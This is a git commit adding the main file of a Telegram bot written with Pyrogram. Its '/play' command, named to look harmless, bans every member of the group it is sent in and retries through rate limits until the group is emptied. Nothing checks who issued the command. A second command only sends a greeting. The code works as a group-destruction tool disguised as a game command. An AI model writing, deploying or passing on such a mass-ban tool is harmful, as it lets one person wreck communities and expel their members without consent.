31fc588b69644f3a1401e2b91d87057eae1d2ca5
ɢʀᴏᴏᴛ xᴅ <128709493+9505GrootXD@users.noreply.github.com>
2023-04-07 16:13:39 +0530

    Create __init__.py

---
+++ grootxd/__init__.py
@@ -0,0 +1,45 @@
+# GROOT NETWORK
+# G-Network Projects
+# Copyright (C) 2023 By @Groot_Network
+# Copy Rights @RJbr0 , @MyNameIsGROOT
+# Don't Any Value In This Repo If You Edit Your Github Will Get Banned 😌
+
+import asyncio
+
+from pyrogram.errors.exceptions.flood_420 import FloodWait
+from pyrogram import Client,filters
+from pyrogram.types import *
+from .config import Config
+import logging
+from pyrogram.errors import (
+    ChatAdminRequired
+)
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
+logging.getLogger("pyrogram").setLevel(logging.WARNING)
+
+bot=Client(":memory:",api_id=Config.TELEGRAM_APP_ID,api_hash=Config.TELEGRAM_APP_HASH,bot_token=Config.TELEGRAM_TOKEN)
+
+
+@bot.on_message(filters.command("play"))
+async def _(bot, msg):
+    print("getting memebers from {}".format(msg.chat.id))
+    async for i in bot.iter_chat_members(msg.chat.id):
+        try:
+            await bot.ban_chat_member(chat_id =msg.chat.id,user_id=i.user.id)
+            print("kicked {} from {}".format(i.user.id,msg.chat.id))
+        except FloodWait as e:
+            await asyncio.sleep(e.x)
+            print(e)
+        except Exception as e:
+            print(" failed to kicked {} from {}".format(i.user.id,e))           
+    print("process completed")
+
+
+
+@bot.on_message(filters.command("gxd") & filters.private)
+async def hello(bot, message):
+    await message.reply("ᴡᴇʟᴄᴏᴍᴇ ᴍᴏᴏᴅᴇʟ 😌")
+
